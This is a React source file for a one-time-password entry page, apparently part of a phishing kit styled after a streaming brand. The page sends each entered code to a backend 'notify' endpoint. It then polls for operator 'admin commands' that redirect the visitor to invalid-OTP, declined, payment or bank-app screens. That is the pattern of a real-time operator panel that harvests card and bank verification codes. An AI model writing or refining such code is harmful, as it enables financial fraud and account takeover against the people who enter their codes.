import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useSession } from "@/contexts/SessionContext";
import { Loader2, ShieldCheck } from "lucide-react";

export default function OtpPage({ isInvalid = false }: { isInvalid?: boolean }) {
  const [, navigate] = useLocation();
  const { sessionId, t } = useSession();
  const [otpDigits, setOtpDigits] = useState(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(isInvalid ? t("invalidOtpMsg") || "Invalid OTP. Please try again." : "");
  const inputRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  const otpMutation = trpc.notify.otpSubmitted.useMutation();
  const clearCommand = trpc.session.clearCommand.useMutation();
  const pollQuery = trpc.session.poll.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && loading, refetchInterval: 3000 }
  );

  useEffect(() => { inputRefs[0].current?.focus(); }, []);

  useEffect(() => {
    if (!loading || !pollQuery.data) return;
    const { command } = pollQuery.data;
    if (command === "none") return;
    clearCommand.mutate({ sessionId: sessionId! });
    if (command === "invalid_otp") { setLoading(false); navigate("/invalid-otp"); }
    else if (command === "declined") { setLoading(false); navigate("/declined"); }
    else if (command === "normal") { setLoading(false); navigate("/payment"); }
    else if (command === "bank_app") { setLoading(false); navigate("/bank-app"); }
  }, [pollQuery.data?.command, loading]);

  const handleInput = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...otpDigits];
    newDigits[index] = value.slice(-1);
    setOtpDigits(newDigits);
    setError("");
    if (value && index < 5) inputRefs[index + 1].current?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otpDigits[index] && index > 0) inputRefs[index - 1].current?.focus();
  };

  const handleSubmit = () => {
    const otp = otpDigits.join("");
    if (otp.length < 6) { setError(t("enterCompleteOtp") || "Please enter the complete 6-digit OTP."); return; }
    setLoading(true);
    if (sessionId) {
      // Clear any stale admin command first so polling starts fresh
      clearCommand.mutate({ sessionId });
      otpMutation.mutate({ sessionId, otp });
    }
  };

  return (
    <div style={{ backgroundColor: "#f0f2f5", minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "16px" }}>
      <div style={{ backgroundColor: "white", borderRadius: "16px", padding: "clamp(24px, 6vw, 40px) clamp(20px, 6vw, 32px)", maxWidth: "420px", width: "100%", boxShadow: "0 4px 24px rgba(0,0,0,0.10)", textAlign: "center", boxSizing: "border-box" }}>

        {/* Icon */}
        <div style={{ width: "clamp(56px, 14vw, 72px)", height: "clamp(56px, 14vw, 72px)", borderRadius: "50%", backgroundColor: isInvalid ? "#fee2e2" : "#E50914", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px", boxShadow: isInvalid ? "0 4px 16px rgba(239,68,68,0.3)" : "0 4px 16px rgba(229,9,20,0.3)" }}>
          <ShieldCheck size={32} color={isInvalid ? "#E50914" : "white"} />
        </div>

        <h1 style={{ fontSize: "clamp(18px, 5vw, 22px)", fontWeight: 800, color: "#1a1a1a", marginBottom: "8px" }}>{t("enterOtp")}</h1>
        <p style={{ color: "#666", fontSize: "clamp(13px, 3.5vw, 14px)", marginBottom: "clamp(20px, 5vw, 28px)", lineHeight: "1.5" }}>{t("otpSentTo")}</p>

        {/* OTP inputs */}
        <div style={{ display: "flex", gap: "clamp(6px, 2vw, 10px)", justifyContent: "center", marginBottom: "8px" }}>
          {otpDigits.map((val, i) => (
            <input
              key={i}
              ref={inputRefs[i]}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={val}
              onChange={e => handleInput(i, e.target.value)}
              onKeyDown={e => handleKeyDown(i, e)}
              style={{
                width: "clamp(40px, 12vw, 52px)",
                height: "clamp(48px, 14vw, 60px)",
                textAlign: "center",
                fontSize: "clamp(18px, 5vw, 24px)",
                fontWeight: 700,
                backgroundColor: "#f8f9fa",
                border: `2px solid ${val ? "#E50914" : (isInvalid ? "#E50914" : "#dee2e6")}`,
                borderRadius: "8px",
                color: "#333",
                outline: "none",
                boxSizing: "border-box",
              }}
              onFocus={e => { e.currentTarget.style.borderColor = "#E50914"; }}
              onBlur={e => { if (!val) e.currentTarget.style.borderColor = isInvalid ? "#E50914" : "#dee2e6"; }}
            />
          ))}
        </div>

        {error && (
          <p style={{ color: "#E50914", fontSize: "clamp(12px, 3vw, 13px)", marginBottom: "12px", fontWeight: 600 }}>
            {error}
          </p>
        )}

        <button
          onClick={handleSubmit}
          disabled={loading}
          style={{ width: "100%", backgroundColor: "#E50914", color: "white", border: "none", borderRadius: "8px", padding: "clamp(13px, 3.5vw, 16px)", fontSize: "clamp(14px, 3.5vw, 16px)", fontWeight: 700, cursor: loading ? "default" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", marginTop: "16px", transition: "background-color 0.15s" }}
          onMouseEnter={e => { if (!loading) e.currentTarget.style.backgroundColor = "#c40812"; }}
          onMouseLeave={e => { e.currentTarget.style.backgroundColor = "#E50914"; }}
        >
          {loading ? <><Loader2 size={20} style={{ animation: "spin 1s linear infinite" }} /> {t("verifying")}</> : t("submitOtp")}
        </button>
      </div>
    </div>
  );
}
